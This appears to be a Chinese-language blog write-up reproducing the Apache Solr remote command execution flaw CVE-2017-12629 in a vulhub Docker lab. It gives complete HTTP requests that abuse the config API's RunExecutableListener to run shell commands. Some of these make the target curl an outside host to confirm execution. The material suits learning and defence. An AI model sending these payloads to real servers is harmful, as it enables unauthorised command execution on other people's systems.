---
layout: post
title: Apache Solr 远程命令执行漏洞
tags: solr
categories: CVE-2017-12629-RCE
---

# Apache Solr 远程命令执行漏洞（CVE-2017-12629-RCE）

## 漏洞描述

Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。原理大致是文档通过Http利用XML加到一个搜索集合中。查询该集合也是通过 http收到一个XML/JSON响应来实现。

该漏洞是由于RunExecutableListener类中使用了Runtime.getRuntime().exec()方法，可用于在某些特定事件中执行任意命令；而使用config API传入add-listener命令即可调RunExecutableListener

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Solr/CVE-2017-12629-RCE/15936570183643.jpg)

而这里的“exe”，“dir”，“args”内容也都可以通过http的方式传入，所以在没有访问控制的情况下任何人都可以通过该config API 达到任意命令执行的操作，能够触发命令执行的事件（event)有两个：postCommit 和 newSearcher。

## 漏洞复现

首先部署是使用的GitHub中的[vulhub](!https://github.com/vulhub/vulhub.git)项目docker一键部署的。
环境启动后访问`http://your-ip:8983/`即可查看到Apache solr的管理页面，无需登录

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Solr/CVE-2017-12629-RCE/15936581688670.jpg)

一、使用postCommit时，需要使用update进行collection更新后命令才会执行，因此需要两次进行请求，其中demo是创建的Core（核心），不同的环境Core也不同。通过如下API获取所有的核心：`http://your-ip:8983/solr/admin/cores?indexInfo=false&wt=json`

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Solr/CVE-2017-12629-RCE/15936861982136.jpg)

1.首先发送POST请求，通过config API调用RunExecutableListener类，使用postCommit事件，创建一个listener，其中设置exe的值为我们想执行的命令，dir设置我们要执行命令使用的bash，args的值是命令参数：

```
POST /solr/demo/config HTTP/1.1
Host: your-ip:8983
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0
Connection: close
Content-Length: 210

{
  "add-listener" : {
    "event":"postCommit",
    "name":"newlistener",
    "class":"solr.RunExecutableListener",
    "exe":"sh",
    "dir":"/usr/bin/",
    "args":["-c", "touch /tmp/success"]
  }
}
```

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Solr/CVE-2017-12629-RCE/15936618664405.jpg)


然后发送POST请求，进行update操作，触发刚才添加的listener：

```
POST /solr/demo/update HTTP/1.1
Host: 192.168.2.134:8983
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0
Connection: close
Content-Type: application/json
Content-Length: 15

[{"id":"test"}]
```

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Solr/CVE-2017-12629-RCE/15936621054028.jpg)

进入容器中，查看/tmp/success创建成功

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Solr/CVE-2017-12629-RCE/15936621692339.jpg)

2.也可以通过在本地使用python开一个web服务，让目标访问本地的服务来证明命令是否执行，在重复添加listener时要修改name参数，不能重复

```
POST /solr/demo/config HTTP/1.1
Host: 192.168.2.134:8983
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0
Connection: close
Content-Type: application/json
Content-Length: 211

{
  "add-listener" : {
    "event":"postCommit",
    "name":"newlistener2",
    "class":"solr.RunExecutableListener",
    "exe":"curl",
    "dir":"/usr/bin/",
    "args":["http://本地IP:8080"]
  }
}
```

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Solr/CVE-2017-12629-RCE/15936628789935.jpg)

然后发送POST请求，进行update操作，触发刚才添加的listener：

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Solr/CVE-2017-12629-RCE/15936630129150.jpg)

同时本地开启服务，每执行一次update本地都会显示一条请求记录

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Solr/CVE-2017-12629-RCE/15936631091483.jpg)


二、使用newSearcher事件（event）时可直接执行命令

首先发送POST请求，通过config API调用RunExecutableListener类，使用newSearcher事件，创建一个listener，其中设置exe的值为我们想执行的命令，dir设置我们要执行命令使用的bash，args的值是命令参数：

```
POST /solr/demo/config HTTP/1.1
Host: 192.168.2.134:8983
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0
Connection: close
Content-Type: application/json
Content-Length: 212

{
  "add-listener" : {
    "event":"newSearcher",
    "name":"newlistener5",
    "class":"solr.RunExecutableListener",
    "exe":"curl",
    "dir":"/usr/bin/",
    "args":["http://10.6.5.167:9999"]
  }
}
```

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Solr/CVE-2017-12629-RCE/15936633617555.jpg)

同时本地开启服务，每添加一次listener（需要修改name）本地都会显示一条请求记录，newSearcher事件不需要执行update

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Solr/CVE-2017-12629-RCE/15936634757623.jpg)


## 参考链接

<https://paper.seebug.org/425/#second-vulnerability-remote-code-execution>
